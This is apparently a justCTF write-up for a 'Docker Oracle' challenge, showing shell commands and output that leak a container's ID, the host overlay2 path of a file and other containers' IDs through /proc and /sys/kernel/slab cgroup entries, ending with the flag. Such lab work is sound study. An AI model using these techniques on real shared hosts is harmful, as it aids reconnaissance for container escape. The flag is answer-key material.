First acquire the needed information:  
\#1 CPU Model  
`cat /proc/cpuinfo | grep "model name" | head -n1 | cut -d' ' -f3-  `  
Ex.: Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz

\#2 Container ID  
`grep -Eow "docker/.*" /proc/self/cgroup | head -n1 | cut -d'/' -f2`  
Ex.: 3eec8fef3ed868e8f1a8c96a8e23e1f5076bc46e36db829fd0ebd0f28b166fb5

\#3 The host path of the `/secret` file  
`echo "/var/lib/docker/overlay2/"$(mount | grep -o workdir=.*, | cut -d'/' -f6)"/diff/secret"`  
Ex.: /var/lib/docker/overlay2/f575721f8fc8895c2a6f217e54b51e7da14646b3aba2daf1f325ec6eea28af4c/diff/secret

\#4 Get the host container ID  
Run a session in the background  
`socat - UNIX-CONNECT:/oracle.sock &`

Find the socket-related connection files
`find / -iname "*sock*" | grep docker`  
```
/sys/kernel/slab/:A-0000192/cgroup/cred_jar(602:docker.socket)
/sys/kernel/slab/:A-0001024/cgroup/PING(602:docker.socket)
/sys/kernel/slab/sock_inode_cache/cgroup/sock_inode_cache(602:docker.socket)
/sys/kernel/slab/sock_inode_cache/cgroup/sock_inode_cache(1058:docker.service)
/sys/kernel/slab/kmalloc-64/cgroup/kmalloc-64(602:docker.socket)
/sys/kernel/slab/dentry/cgroup/dentry(602:docker.socket)
/sys/kernel/slab/:A-0000064/cgroup/anon_vma_chain(602:docker.socket)
/sys/kernel/slab/anon_vma/cgroup/anon_vma(602:docker.socket)
/sys/kernel/slab/inode_cache/cgroup/inode_cache(602:docker.socket)
find: '/root': Permission denied
/sys/kernel/slab/:A-0000256/cgroup/filp(602:docker.socket)
/sys/kernel/slab/:A-0000208/cgroup/vm_area_struct(602:docker.socket)
/sys/kernel/slab/:A-0000128/cgroup/pid(602:docker.socket)
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/proc/tty/driver': Permission denied
```

This is the one that matters:
`ls  /sys/kernel/slab/:A-0000256/cgroup/` 
```
'filp(1017:polkit.service)'
'filp(102:sys-kernel-debug.mount)'
'filp(1045:cloud-config.service)'
'filp(1058:docker.service)'
'filp(115:sys-kernel-tracing.mount)'
'filp(12342:session-19.scope)'
'filp(128:systemd-journald.service)'
'filp(1602:init.scope)'
'filp(1719:snap-core18-1944.mount)'
'filp(1732:snap-snapd-10707.mount)'
'filp(1745:snapd.service)'
'filp(1758:snap-lxd-19032.mount)'
'filp(18076:supervisor.service)'
'filp(2296:user@0.service)'
'filp(2304:dbus.socket)'
'filp(238:sys-fs-fuse-connections.mount)'
'filp(251:sys-kernel-config.mount)'
'filp(31174:accounts-daemon.service)'
'filp(355:multipathd.service)'
'filp(368:boot-efi.mount)'
'filp(37472:4bc07b43dbcaef433faab8ec71261d3bb3a9098d89db3e312f54b87a59f9fb72)'
'filp(37863:3eec8fef3ed868e8f1a8c96a8e23e1f5076bc46e36db829fd0ebd0f28b166fb5)'
'filp(381:snap-core18-1885.mount)'
'filp(394:snap-lxd-16922.mount)'
'filp(407:snap-snapd-9607.mount)'
'filp(485:systemd-timesyncd.service)'
'filp(537:systemd-networkd.service)'
'filp(563:systemd-resolved.service)'
'filp(576:cloud-init.service)'
'filp(589:systemd-udevd.service)'
'filp(602:docker.socket)'
'filp(615:snapd.socket)'
'filp(667:atd.service)'
'filp(680:containerd.service)'
'filp(693:cron.service)'
'filp(706:dbus.service)'
'filp(732:do-agent.service)'
'filp(76:dev-hugepages.mount)'
'filp(784:irqbalance.service)'
'filp(810:rsyslog.service)'
'filp(849:ssh.service)'
'filp(875:systemd-logind.service)'
'filp(89:dev-mqueue.mount)'
'filp(961:serial-getty@ttyS0.service)'
'filp(993:getty@tty1.service)'
```

Notice the lines
```
'filp(37472:4bc07b43dbcaef433faab8ec71261d3bb3a9098d89db3e312f54b87a59f9fb72)'
'filp(37863:3eec8fef3ed868e8f1a8c96a8e23e1f5076bc46e36db829fd0ebd0f28b166fb5)'
```
One is your container's ID, the other is the host container's. Put that `3eec8fef3[...]' is your your container ID, the other one is the host's. Use it in both Level 5 and Level 6 questions.


Start the session with the socket:  
`socat - UNIX-CONNECT:/oracle.sock`

#### [Level 1] What is the full *cpu model* model used?
Info \#1
  
#### [Level 2] What is your *container id*?  
Info \#2
  
#### [Level 3] Let me check if you truly given me your container id. I created a /secret file on your machine. What is the hidden secret?
Type anything to exit the session. Leave this running on the background and start a new session on the socket. The backgrounded command will echo you the new secret value:  
`while [ true ]; do sleep 5; cat /secret; echo ""; done &`  
Copy the new value when it's echoed and give it to the program.  

#### [Level 4] Okay but... where did I actually write it? What is the path on the host that I wrote the /secret file to which then appeared in your container? (ps: there are multiple paths which you should be able to figure out but I only match one of them)  
Info \#3

#### [Level 5] Good! Now, can you give me an id of any *other* running container?  
Info \#4  
4bc07b43dbcaef433faab8ec71261d3bb3a9098d89db3e312f54b87a59f9fb72  

#### [Level 6] Now, let's go with the real and final challenge. I, the Docker Oracle, am also running in a container. What is my container id?
Info \#4  
 4bc07b43dbcaef433faab8ec71261d3bb3a9098d89db3e312f54b87a59f9fb72

```
[Levels cleared] Well done! Here is your flag!
justCTF{maaybe-Docker-will-finally-fix-this-after-this-task?}

Good job o/
```

Telegram
